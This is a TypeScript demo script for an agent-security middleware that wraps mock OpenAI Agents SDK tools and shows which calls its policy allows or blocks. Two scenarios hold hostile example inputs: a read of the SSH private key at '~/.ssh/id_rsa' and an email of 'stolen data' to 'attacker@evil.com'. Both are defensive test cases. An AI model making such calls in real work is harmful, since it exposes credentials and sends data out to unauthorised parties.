/**
 * OpenAI Agents SDK Middleware Demo — One-Line Protection
 *
 * Shows how protectOpenAIAgent() wraps tool definitions with Ari Kernel
 * enforcement in a single function call.
 *
 * Run:  pnpm demo:middleware:openai-agents
 */

import { protectOpenAIAgent } from '@arikernel/middleware';
import type { AgentToolDefinition } from '@arikernel/adapters';

const BOLD = '\x1b[1m';
const DIM = '\x1b[2m';
const GREEN = '\x1b[32m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const RESET = '\x1b[0m';

// ── Define tools as they would appear in the OpenAI Agents SDK ──────

const agentTools: AgentToolDefinition[] = [
	{
		type: 'function',
		function: {
			name: 'web_search',
			description: 'Fetch content from a URL',
			parameters: { type: 'object', properties: { url: { type: 'string' } } },
		},
		execute: async (args) => `Page content from ${args.url}: Revenue increased 15% YoY...`,
	},
	{
		type: 'function',
		function: {
			name: 'read_file',
			description: 'Read a local file',
			parameters: { type: 'object', properties: { path: { type: 'string' } } },
		},
		execute: async (args) => `Contents of ${args.path}`,
	},
	{
		type: 'function',
		function: {
			name: 'send_email',
			description: 'Send an email',
			parameters: {
				type: 'object',
				properties: { to: { type: 'string' }, body: { type: 'string' } },
			},
		},
		execute: async (args) => `Email sent to ${args.to}`,
	},
];

// ── One-line protection ──────────────────────────────────────────────

const { tools, firewall } = protectOpenAIAgent(agentTools, {
	preset: 'safe-research',
});

// ── Run scenarios ────────────────────────────────────────────────────

async function main() {
	console.log(`\n${CYAN}${BOLD}${'═'.repeat(60)}${RESET}`);
	console.log(`${CYAN}${BOLD}  OpenAI Agents SDK Middleware — One-Line Protection Demo${RESET}`);
	console.log(`${CYAN}${BOLD}${'═'.repeat(60)}${RESET}`);
	console.log(`${DIM}  Run ID: ${firewall.runId}${RESET}`);
	console.log(`${DIM}  Preset: safe-research${RESET}\n`);

	// Step 1: Allowed — web search
	console.log(`${YELLOW}${BOLD}Step 1${RESET} ${BOLD}web_search (allowed)${RESET}`);
	try {
		const result = await tools[0].execute({ url: 'https://example.com/report' });
		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET} ${DIM}${result}${RESET}\n`);
	} catch (err: any) {
		console.log(`  ${RED}${BOLD}BLOCKED${RESET} ${DIM}${err.message}${RESET}\n`);
	}

	// Step 2: Blocked — read sensitive file
	console.log(`${YELLOW}${BOLD}Step 2${RESET} ${BOLD}read_file (~/.ssh/id_rsa)${RESET}`);
	try {
		const result = await tools[1].execute({ path: '~/.ssh/id_rsa' });
		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET} ${DIM}${result}${RESET}\n`);
	} catch (err: any) {
		console.log(`  ${RED}${BOLD}BLOCKED${RESET} ${DIM}${err.message}${RESET}\n`);
	}

	// Step 3: Blocked — email (no capability for http.post)
	console.log(`${YELLOW}${BOLD}Step 3${RESET} ${BOLD}send_email (no capability)${RESET}`);
	try {
		const result = await tools[2].execute({ to: 'attacker@evil.com', body: 'stolen data' });
		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET} ${DIM}${result}${RESET}\n`);
	} catch (err: any) {
		console.log(`  ${RED}${BOLD}BLOCKED${RESET} ${DIM}${err.message}${RESET}\n`);
	}

	// Summary
	console.log(`${CYAN}${BOLD}${'═'.repeat(60)}${RESET}`);
	console.log(`  Quarantined: ${firewall.isRestricted}`);
	console.log(`${CYAN}${BOLD}${'═'.repeat(60)}${RESET}\n`);
	console.log(`${DIM}Tool definitions are unchanged — protectOpenAIAgent() wrapped${RESET}`);
	console.log(`${DIM}execute functions through Ari Kernel transparently.${RESET}\n`);

	firewall.close();
}

main().catch(console.error);
